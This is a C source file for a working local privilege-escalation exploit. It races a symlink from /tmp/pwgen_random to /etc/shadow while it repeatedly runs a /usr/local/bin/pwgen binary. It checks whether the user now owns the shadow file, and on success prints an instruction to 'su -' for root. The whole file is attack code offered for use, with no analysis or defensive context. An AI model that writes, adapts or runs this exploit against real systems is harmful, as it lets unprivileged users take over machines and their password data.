/*
 * This program continuously creates a symbolic link 
 * from a temporary file (/tmp/pwgen_random) to /etc/shadow while repeatedly
 * invoking /usr/local/bin/pwgen with a piped input. It then checks if /etc/shadow
 * has become owned by the current user.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#include <pwd.h>

#define TARGET_FILE "/etc/shadow"
#define TMP_FILE    "/tmp/pwgen_random"

/* Global flag to control loops */
volatile sig_atomic_t running = 1;
/* Thread identifier for the symlink attack loop */
pthread_t symlink_thread;

/* 
 * cleanup() - Performs cleanup on exit:
 *   - Stops the symlink loop thread.
 *   - Removes the temporary file.
 */
void cleanup(void) {
    printf("[*] Cleaning up...\n");

    /* Signal the thread to stop */
    running = 0;

    /* Cancel and join the background thread */
    pthread_cancel(symlink_thread);
    pthread_join(symlink_thread, NULL);

    /* Remove the temporary file */
    if (unlink(TMP_FILE) == -1 && errno != ENOENT) {
        perror("unlink");
    }
}

/*
 * signal_handler() - Catches signals (e.g. SIGINT) and exits cleanly.
 */
void signal_handler(int sig) {
    (void)sig;  /* Unused parameter */
    running = 0;
    exit(0);
}

/*
 * symlink_attack_loop() - This thread repeatedly unlinks TMP_FILE and creates
 * a symbolic link pointing to TARGET_FILE.
 */
void *symlink_attack_loop(void *arg) {
    (void)arg; /* Unused parameter */
    while (running) {
        /* Remove TMP_FILE if it exists; ignore errors if it does not */
        unlink(TMP_FILE);

        /* Create a symbolic link from TMP_FILE to TARGET_FILE */
        if (symlink(TARGET_FILE, TMP_FILE) == -1) {
            /* Optional: you may uncomment the next line for debugging */
            // fprintf(stderr, "symlink error: %s\n", strerror(errno));
        }

        /* Optionally yield or sleep a tiny bit. The original script loops tightly. */
        // usleep(100);  /* Sleep 100 microseconds (optional) */
    }
    return NULL;
}

int main(void) {
    /* Register cleanup to be called on exit */
    atexit(cleanup);
    /* Setup signal handlers for SIGINT and SIGTERM */
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    /* Get the current user’s uid and username */
    uid_t current_uid = getuid();
    struct passwd *pw = getpwuid(current_uid);
    if (!pw) {
        perror("getpwuid");
        exit(EXIT_FAILURE);
    }
    char *current_user = pw->pw_name;
    printf("[*] Current user: %s\n", current_user);

    /* Start the background symlink attack loop */
    if (pthread_create(&symlink_thread, NULL, symlink_attack_loop, NULL) != 0) {
        perror("pthread_create");
        exit(EXIT_FAILURE);
    }
    printf("[*] Started symlink attack loop (Thread ID: %lu)\n", (unsigned long)symlink_thread);

    /* Main loop: repeatedly invoke pwgen and check if TARGET_FILE is now owned by the current user */
    printf("[*] Starting pwgen loop...\n");
    while (running) {
        /*
         * Execute the pwgen command with piped input.
         * The command is equivalent to:
         *
         *   printf "dummy_entropy\n\004" | /usr/local/bin/pwgen -e -w >/dev/null 2>&1
         *
         * Note: system() invokes the shell to execute the entire command string.
         */
        int ret = system("printf 'dummy_entropy\n\004' | /usr/local/bin/pwgen -e -w >/dev/null 2>&1");
        (void)ret; /* Return value is ignored, as in the original script */

        /* Check if TARGET_FILE is now owned by the current user */
        struct stat sb;
        if (stat(TARGET_FILE, &sb) == 0) {
            if (sb.st_uid == current_uid) {
                printf("\n[+] Exploit succeeded! %s is now owned by %s.\n", TARGET_FILE, current_user);
                printf("[+] Run: su - to gain root!\n");
                break;
            }
        }
    }

    return 0;
}
